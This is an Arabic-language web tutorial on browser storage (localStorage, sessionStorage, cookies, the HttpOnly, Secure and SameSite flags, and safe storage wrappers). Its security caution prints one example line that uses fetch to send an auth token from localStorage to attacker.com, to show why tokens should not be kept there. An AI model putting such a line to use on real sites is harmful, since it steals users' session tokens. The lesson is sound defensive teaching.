# 13 - التخزين في جانب العميل: التخزين المحلي وملفات الكوكيز (Storage & Cookies)

> 🌐 **Language / اللغة:** [English 🇬🇧](../en/13-browser-storage.md) | [العربية 🇸🇦](./13-browser-storage.md)

---

## 🎯 1. نظرة عامة وأهداف التعلم (Overview & Learning Objectives)

تحتاج تطبيقات الويب باستمرار إلى تذكر حالة المستخدم وتفضيلاته عبر عمليات إعادة تحميل الصفحة، أو إغلاق لسان التصفح، أو انقطاع الإنترنت — مثل حفظ الوضع الليلي (Dark Mode)، ومحتويات سلة المشتريات، وحالة تسجيل الدخول، ومسودات النصوص.

يوفر المتصفح عدة آليات تخزين متباينة، تختلف كلياً في سعتها التخزينية، وفترة بقائها، وخصائصها الأمنية.

بنهاية هذا الدرس، ستتقن:
1. الفروق الجوهرية والتشغيلية بين **`localStorage`** و **`sessionStorage`** وملفات **الكوكيز (Cookies)**.
2. استخدام واجهة التخزين (`setItem`, `getItem`, `removeItem`, `clear`).
3. تخزين الكائنات المعقدة بالتحويل إلى JSON والتعامل مع خطأ امتلاء الذاكرة `QuotaExceededError`.
4. مزامنة البيانات بين عدة ألسنة تصفح مفتوحة في نفس اللحظة عبر حدث `'storage'`.
5. فهم أعلام أمان الكوكيز: **`HttpOnly`** و **`Secure`** و **`SameSite`**.
6. القاعدة الأمنية الذهبية: لماذا يجب **ألا تخزن رموز المصادقة الحساسة (Tokens)** إطلاقاً في `localStorage`.

---

## 📊 2. جدول المقارنة الشامل لآليات التخزين

| الميزة | `localStorage` | `sessionStorage` | كوكيز الـ HTTP | `IndexedDB` |
| :--- | :---: | :---: | :---: | :---: |
| **السعة التخزينية** | ~5MB – 10MB | ~5MB | ~4KB فقط | أكثر من 250MB (جيجابايت) |
| **فترة البقاء** | دائمة (حتى يحذفها المستخدم) | تموت فور إغلاق لسان المتصفح | محددة بتاريخ انتهاء صلاحية | دائمة |
| **عزل ألسنة التصفح** | مشتركة بين كل ألسنة نفس النطاق | معزولة في اللسان الحالي فقط | مشتركة بين ألسنة نفس النطاق | مشتركة |
| **الإرسال للخادم تلقائياً؟** | لا (في المتصفح فقط) | لا (في المتصفح فقط) | نعم (مع كل طلب HTTP!) | لا |
| **نمط الاستدعاء** | متزامن (Synchronous) | متزامن (Synchronous) | معالجة نصوص | لاتزامني (Promises) |
| **طريقة الوصول برمجياً** | `window.localStorage` | `window.sessionStorage` | `document.cookie` | `window.indexedDB` |

---

## 💾 3. واجهة التخزين المدمجة (`localStorage` و `sessionStorage`)

تتشارك كلا الواجهتين نفس الدوال البرمجية تماماً:

```javascript
// 1. تخزين البيانات (المفاتيح والقيم يجب أن تكون نصوصاً Strings دائماً):
localStorage.setItem('theme', 'dark');

// تخزين الكائنات والمصفوفات يتطلب تحويلها لنص بـ JSON.stringify:
const userProfile = { id: 101, name: 'سارة', preferences: { alerts: true } };
localStorage.setItem('user_profile', JSON.stringify(userProfile));

// 2. قراءة البيانات:
const currentTheme = localStorage.getItem('theme'); // 'dark'

// قراءة وتفكيك الكائنات بأمان:
const rawProfile = localStorage.getItem('user_profile');
const profile = rawProfile ? JSON.parse(rawProfile) : null;
console.log(profile?.name); // 'سارة'

// 3. حذف البيانات:
localStorage.removeItem('theme'); // حذف مفتاح محدد
localStorage.clear();              // مسح كل البيانات المخزنة لهذا الموقع بالكامل
```

### التعامل مع امتلاء السعة ووضع التصفح المتخفي:
في وضع التصفح الخاص (Incognito) أو عند امتلاء مساحة الـ 5MB، ترمي دالة `setItem()` خطأً استثنائياً قاتلاً هو **`QuotaExceededError`**:

```javascript
function safeSetStorage(key, value) {
  try {
    localStorage.setItem(key, JSON.stringify(value));
  } catch (error) {
    if (error.name === 'QuotaExceededError') {
      console.warn('تم تجاوز سعة التخزين المسموحة! نقوم بحذف البيانات المؤقتة القديمة.');
      // حذف البيانات غير الضرورية
    } else {
      console.error('تم رفض الوصول للتخزين (قد يكون المتصفح في الوضع المتخفي):', error);
    }
  }
}
```

---

## 🔄 4. مزامنة البيانات بين الألسنة المفتوحة: حدث `'storage'`

عند تعديل أي قيمة في `localStorage`، يطلق المتصفح تلقائياً حدث `'storage'` في **جميع ألسنة ونوافذ التصفح الأخرى المفتوحة لنفس الموقع**:

```javascript
// الاستماع في اللسان (ب) عندما يقوم المستخدم بتسجيل الخروج أو تغيير الثيم في اللسان (أ):
window.addEventListener('storage', (event) => {
  console.log('تم تعديل التخزين من لسان تصفح آخر!');
  console.log('المفتاح المعدل:', event.key);
  console.log('القيمة القديمة:', event.oldValue);
  console.log('القيمة الجديدة:', event.newValue);

  if (event.key === 'theme') {
    applyTheme(event.newValue);
  }
});
```

---

## 🍪 5. ملفات تعريف الارتباط (HTTP Cookies) وأعلام الأمان

صُممت الكوكيز أساساً لتحديد هوية جلسة المستخدم مع الخادم. يرسلها المتصفح تلقائياً داخل ترويسة `Cookie` مع كل طلب شبكة صادر لنفس النطاق:

```javascript
// قراءة الكوكيز في جافا سكريبت (ترجع نصاً واحداً مجمعاً ومفصولاً بفواصل منقوطة):
console.log(document.cookie); // "session_id=xyz123; user_theme=dark"

// ضبط كوكي من داخل جافا سكريبت:
document.cookie = "user_theme=light; max-age=86400; path=/; SameSite=Lax; Secure";
```

### الأعلام الأمنية الثلاثة الحاسمة (Security Flags):
1. **علم `HttpOnly`:**  
   عندما يضبط الخادم الكوكي بترويسة `Set-Cookie: ...; HttpOnly`، **لا تستطيع جافا سكريبت (`document.cookie`) قراءة هذا الكوكي نهائياً**!  
   *الأثر الأمني:* إذا أصيب الموقع بثغرة XSS، فلن يتمكن المهاجم من سرقة جلسة المستخدم لأن السكربت عاجز عن قراءة الكوكي.
2. **علم `Secure`:**  
   يأمر المتصفح بعدم إرسال الكوكي إلا عبر اتصالات **HTTPS** المشفرة فقط، لحمايته من التنصت عبر الشبكات العامة.
3. **علم `SameSite`:**  
   يحمي الموقع من ثغرات تزوير الطلبات عبر المواقع (CSRF):
   - `SameSite=Strict`: لا يُرسل الكوكي إطلاقاً مع أي طلب صادر من موقع خارجي.
   - `SameSite=Lax` (الوضع الافتراضي): يُرسل الكوكي فقط عند النقر على الروابط الخارجية الآمنة (الانتقال العلوي).
   - `SameSite=None`: يسمح بالإرسال عبر المواقع (يتطلب تفعيل علم `Secure` إجبارياً).

---

## 🛡️ 6. القاعدة الأمنية الذهبية: أين نخزن رموز الدخول (Tokens)؟

> [!CAUTION]
> **إياك وتخزين رموز المصادقة الحساسة (مثل الـ JWT غير المشفر) داخل `localStorage`!**  
> أي كود جافا سكريبت يعمل في الصفحة — بما في ذلك سكربتات الإعلانات، أو أدوات الإحصائيات، أو أي حمولة XSS يتم حقنها — يستطيع قراءة محتويات `localStorage` بالكامل بسطر واحد فقط:
> ```javascript
> fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'));
> ```
> **المعيار الهندسي المعتمد:** خزن رموز الجلسات والمصادقة في كوكيز محمية بـ **`HttpOnly` + `Secure` + `SameSite=Lax`** يصدرها الخادم الخلفي مباشرة.

---

## 🧼 7. مقارنة الكود النظيف (Clean Code: Good vs Bad)

```javascript
// ❌ كود سيئ: الوصول المباشر لـ localStorage دون معالجة أخطاء
localStorage.setItem('cart', JSON.stringify(cart)); // قد ينهار في التصفح الخاص أو التضمين داخل iframe!

// ✅ كود ممتاز: تغليف التخزين داخل وحدة خدمة مركزية آمنة (Storage Service)
const StorageService = {
  get(key, fallback = null) {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : fallback;
    } catch {
      return fallback;
    }
  },
  set(key, value) {
    try {
      localStorage.setItem(key, JSON.stringify(value));
      return true;
    } catch (err) {
      console.warn('فشلت عملية الكتابة في التخزين المحلي:', err);
      return false;
    }
  }
};
```

---

## 📝 8. الخلاصة والدرس التالي
- استخدم **`localStorage`** لحفظ الإعدادات الطويلة في المتصفح (مثل المظهر المفضل).
- استخدم **`sessionStorage`** للبيانات المؤقتة المحصورة بلسان التصفح الحالي فقط (مثل خطوات ملء نموذج شراء).
- حول دائماً الكائنات والمصفوفات إلى نصوص بـ **`JSON.stringify()`** قبل تخزينها.
- تعامل بحذر مع استثناء **`QuotaExceededError`** عبر كتل `try...catch`.
- استخدم كوكيز **`HttpOnly`** لحماية جلسات المستخدمين من السرقة في حال وقوع ثغرات XSS.
- في الدرس التالي، سنتعلم كيفية تشخيص وتصحيح الأخطاء باحترافية: **أدوات المطور وفحص الأخطاء (DevTools Inspection & Forensics)**.
